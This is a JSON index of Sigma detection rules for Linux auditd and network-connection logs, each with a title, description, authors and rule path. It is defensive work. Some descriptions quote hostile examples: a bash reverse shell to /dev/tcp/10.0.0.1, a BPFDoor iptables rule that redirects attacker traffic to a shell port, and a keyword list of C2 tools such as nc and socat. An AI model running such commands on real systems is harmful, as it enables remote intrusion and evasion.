[{"title":"Possible Coin Miner CPU Priority Param","description":"Detects command line parameter very often used with coin miners","author":"Florian Roth (Nextron Systems)","link":"rules/sigma/rules/linux/auditd/lnx_auditd_coinminer.yml","tags":["logsource:*/linux/auditd"]},{"title":"Use Of Hidden Paths Or Files","description":"Detects calls to hidden files or files located in hidden directories in NIX systems.","author":"David Burkett, @signalblur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_hidden_binary_execution.yml","tags":["logsource:*/linux/auditd"]},{"title":"Password Policy Discovery - Linux","description":"Detects password policy discovery commands","author":"Ömer Günal, oscd.community, Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_password_policy_discovery.yml","tags":["logsource:*/linux/auditd"]},{"title":"System and Hardware Information Discovery","description":"Detects system information discovery commands","author":"Ömer Günal, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_system_info_discovery2.yml","tags":["logsource:*/linux/auditd"]},{"title":"System Owner or User Discovery - Linux","description":"Detects the execution of host or user discovery utilities such as \"whoami\", \"hostname\", \"id\", etc.\nAdversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n","author":"Timur Zinniatullin, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_user_discovery.yml","tags":["logsource:*/linux/auditd"]},{"title":"Modify System Firewall","description":"Detects the removal of system firewall rules. Adversaries may only delete or modify a specific system firewall rule to bypass controls limiting network usage or access.\nDetection rules that match only on the disabling of firewalls will miss this.\n","author":"IAI","link":"rules/sigma/rules/linux/auditd/lnx_auditd_modify_system_firewall.yml","tags":["logsource:*/linux/auditd"]},{"title":"BPFDoor Abnormal Process ID or Lock File Accessed","description":"detects BPFDoor .lock and .pid files access in temporary file storage facility","author":"Rafal Piasecki","link":"rules/sigma/rules/linux/auditd/lnx_auditd_bpfdoor_file_accessed.yml","tags":["logsource:*/linux/auditd"]},{"title":"File Time Attribute Change - Linux","description":"Detect file time attribute change to hide new or changes to existing files.","author":"Igor Fits, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_change_file_time_attr.yml","tags":["logsource:*/linux/auditd"]},{"title":"Modification of ld.so.preload","description":"Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.","author":"E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_ld_so_preload_mod.yml","tags":["logsource:*/linux/auditd"]},{"title":"Systemd Service Creation","description":"Detects a creation of systemd services which could be used by adversaries to execute malicious code.","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_systemd_service_creation.yml","tags":["logsource:*/linux/auditd"]},{"title":"Webshell Remote Command Execution","description":"Detects possible command execution by web application/web shell","author":"Ilyas Ochkov, Beyu Denis, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_web_rce.yml","tags":["logsource:*/linux/auditd"]},{"title":"Linux Reverse Shell Indicator","description":"Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4242 0\u003e\u00261')","author":"Florian Roth (Nextron Systems)","link":"rules/sigma/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml","tags":["logsource:network_connection/linux/*"]},{"title":"Linux Crypto Mining Pool Connections","description":"Detects process connections to a Monero crypto mining pool","author":"Florian Roth (Nextron Systems)","link":"rules/sigma/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml","tags":["logsource:network_connection/linux/*"]},{"title":"Binary Padding - Linux","description":"Adversaries may use binary padding to add junk data and change the on-disk representation of malware.\nThis rule detect using dd and truncate to add a junk data to file.\n","author":"Igor Fits, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_binary_padding.yml","tags":["logsource:*/linux/auditd"]},{"title":"Clipboard Collection of Image Data with Xclip Tool","description":"Detects attempts to collect image data stored in the clipboard from users with the usage of xclip tool.\nXclip has to be installed.\nHighly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\n","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_clipboard_image_collection.yml","tags":["logsource:*/linux/auditd"]},{"title":"Data Compressed","description":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.","author":"Timur Zinniatullin, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_data_compressed.yml","tags":["logsource:*/linux/auditd"]},{"title":"Disable System Firewall","description":"Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network.","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_disable_system_firewall.yml","tags":["logsource:*/linux/auditd"]},{"title":"Hidden Files and Directories","description":"Detects adversary creating hidden file or directory, by detecting directories or files with . as the first character","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_hidden_files_directories.yml","tags":["logsource:*/linux/auditd"]},{"title":"Suspicious History File Operations - Linux","description":"Detects commandline operations on shell history files","author":"Mikhail Larin, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_susp_histfile_operations.yml","tags":["logsource:*/linux/auditd"]},{"title":"Service Reload or Start - Linux","description":"Detects the start, reload or restart of a service.","author":"Jakob Weinzettl, oscd.community, CheraghiMilad","link":"rules/sigma/rules/linux/auditd/lnx_auditd_susp_service_reload_or_restart.yml","tags":["logsource:*/linux/auditd"]},{"title":"Unix Shell Configuration Modification","description":"Detect unix shell configuration modification. Adversaries may establish persistence through executing malicious commands triggered when a new shell is opened.","author":"Peter Matkovski, IAI","link":"rules/sigma/rules/linux/auditd/lnx_auditd_unix_shell_configuration_modification.yml","tags":["logsource:*/linux/auditd"]},{"title":"Clipboard Collection with Xclip Tool - Auditd","description":"Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool.\nXclip has to be installed.\nHighly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\n","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_clipboard_collection.yml","tags":["logsource:*/linux/auditd"]},{"title":"Creation Of An User Account","description":"Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.","author":"Marie Euler, Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_create_account.yml","tags":["logsource:*/linux/auditd"]},{"title":"Credentials In Files - Linux","description":"Detecting attempts to extract passwords with grep","author":"Igor Fits, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_find_cred_in_files.yml","tags":["logsource:*/linux/auditd"]},{"title":"Split A File Into Pieces - Linux","description":"Detection use of the command \"split\" to split files into parts and possible transfer.","author":"Igor Fits, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_split_file_into_pieces.yml","tags":["logsource:*/linux/auditd"]},{"title":"Steganography Hide Files with Steghide","description":"Detects embedding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_steghide_embed_steganography.yml","tags":["logsource:*/linux/auditd"]},{"title":"Steganography Unzip Hidden Information From Picture File","description":"Detects extracting of zip file from image file","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_unzip_hidden_zip_files_steganography.yml","tags":["logsource:*/linux/auditd"]},{"title":"Potentially Suspicious Malware Callback Communication - Linux","description":"Detects programs that connect to known malware callback ports based on threat intelligence reports.\n","author":"hasselj","link":"rules/sigma/rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml","tags":["logsource:network_connection/linux/*"]},{"title":"File or Folder Permissions Change","description":"Detects file and folder permission changes.","author":"Jakob Weinzettl, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_file_or_folder_permissions.yml","tags":["logsource:*/linux/auditd"]},{"title":"Steganography Hide Zip Information in Picture File","description":"Detects appending of zip file to image","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_hidden_zip_files_steganography.yml","tags":["logsource:*/linux/auditd"]},{"title":"System Shutdown/Reboot - Linux","description":"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.","author":"Igor Fits, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_system_shutdown_reboot.yml","tags":["logsource:*/linux/auditd"]},{"title":"Communication To LocaltoNet Tunneling Service Initiated - Linux","description":"Detects an executable initiating a network connection to \"LocaltoNet\" tunneling sub-domains.\nLocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.\nAttackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.\n","author":"Andreas Braathen (mnemonic.io)","link":"rules/sigma/rules/linux/network_connection/net_connection_lnx_domain_localtonet_tunnel.yml","tags":["logsource:network_connection/linux/*"]},{"title":"Linux Network Service Scanning - Auditd","description":"Detects enumeration of local or remote network services.","author":"Alejandro Ortuno, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_network_service_scanning.yml","tags":["logsource:*/linux/auditd"]},{"title":"Linux Capabilities Discovery","description":"Detects attempts to discover the files with setuid/setgid capability on them. That would allow adversary to escalate their privileges.","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_capabilities_discovery.yml","tags":["logsource:*/linux/auditd"]},{"title":"Remove Immutable File Attribute - Auditd","description":"Detects removing immutable file attribute.","author":"Jakob Weinzettl, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_chattr_immutable_removal.yml","tags":["logsource:*/linux/auditd"]},{"title":"Overwriting the File with Dev Zero or Null","description":"Detects overwriting (effectively wiping/deleting) of a file.","author":"Jakob Weinzettl, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_dd_delete_file.yml","tags":["logsource:*/linux/auditd"]},{"title":"Linux Keylogging with Pam.d","description":"Detect attempt to enable auditing of TTY input","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_keylogging_with_pam_d.yml","tags":["logsource:*/linux/auditd"]},{"title":"Loading of Kernel Module via Insmod","description":"Detects loading of kernel modules with insmod command.\nLoadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand.\nAdversaries may use LKMs to obtain persistence within the system or elevate the privileges.\n","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_load_module_insmod.yml","tags":["logsource:*/linux/auditd"]},{"title":"Screen Capture with Import Tool","description":"Detects adversary creating screen capture of a desktop with Import Tool.\nHighly recommended using rule on servers, due to high usage of screenshot utilities on user workstations.\nImageMagick must be installed.\n","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_screencapture_import.yml","tags":["logsource:*/linux/auditd"]},{"title":"Suspicious C2 Activities","description":"Detects suspicious activities as declared by Florian Roth in its 'Best Practice Auditd Configuration'.\nThis includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap.\nThese commands match a few techniques from the tactics \"Command and Control\", including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132)\n","author":"Marie Euler","link":"rules/sigma/rules/linux/auditd/lnx_auditd_susp_c2_commands.yml","tags":["logsource:*/linux/auditd"]},{"title":"Data Exfiltration with Wget","description":"Detects attempts to post the file with the usage of wget utility.\nThe adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.\n","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_data_exfil_wget.yml","tags":["logsource:*/linux/auditd"]},{"title":"Logging Configuration Changes on Linux Host","description":"Detect changes of syslog daemons configuration files","author":"Mikhail Larin, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_logging_config_change.yml","tags":["logsource:*/linux/auditd"]},{"title":"Masquerading as Linux Crond Process","description":"Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.\nSeveral different variations of this technique have been observed.\n","author":"Timur Zinniatullin, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_masquerading_crond.yml","tags":["logsource:*/linux/auditd"]},{"title":"Network Sniffing - Linux","description":"Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n","author":"Timur Zinniatullin, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_network_sniffing.yml","tags":["logsource:*/linux/auditd"]},{"title":"Suspicious Commands Linux","description":"Detects relevant commands often related to malware or hacking activity","author":"Florian Roth (Nextron Systems)","link":"rules/sigma/rules/linux/auditd/lnx_auditd_susp_cmds.yml","tags":["logsource:*/linux/auditd"]},{"title":"Program Executions in Suspicious Folders","description":"Detects program executions in suspicious non-program folders related to malware or hacking activity","author":"Florian Roth (Nextron Systems)","link":"rules/sigma/rules/linux/auditd/lnx_auditd_susp_exe_folders.yml","tags":["logsource:*/linux/auditd"]},{"title":"Screen Capture with Xwd","description":"Detects adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_screencaputre_xwd.yml","tags":["logsource:*/linux/auditd"]},{"title":"Steganography Extract Files with Steghide","description":"Detects extraction of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_steghide_extract_steganography.yml","tags":["logsource:*/linux/auditd"]},{"title":"System Information Discovery - Auditd","description":"Detects System Information Discovery commands","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_system_info_discovery.yml","tags":["logsource:*/linux/auditd"]},{"title":"Communication To Ngrok Tunneling Service - Linux","description":"Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors","author":"Florian Roth (Nextron Systems)","link":"rules/sigma/rules/linux/network_connection/net_connection_lnx_ngrok_tunnel.yml","tags":["logsource:network_connection/linux/*"]},{"title":"Audio Capture","description":"Detects attempts to record audio with arecord utility","author":"Pawel Mazur","link":"rules/sigma/rules/linux/auditd/lnx_auditd_audio_capture.yml","tags":["logsource:*/linux/auditd"]},{"title":"Auditing Configuration Changes on Linux Host","description":"Detect changes in auditd configuration files","author":"Mikhail Larin, oscd.community","link":"rules/sigma/rules/linux/auditd/lnx_auditd_auditing_config_change.yml","tags":["logsource:*/linux/auditd"]},{"title":"Bpfdoor TCP Ports Redirect","description":"All TCP traffic on particular port from attacker is routed to different port. ex. '/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport 22 -j REDIRECT --to-ports 42392'\nThe traffic looks like encrypted SSH communications going to TCP port 22, but in reality is being directed to the shell port once it hits the iptables rule for the attacker host only.\n","author":"Rafal Piasecki","link":"rules/sigma/rules/linux/auditd/lnx_auditd_bpfdoor_port_redirect.yml","tags":["logsource:*/linux/auditd"]}]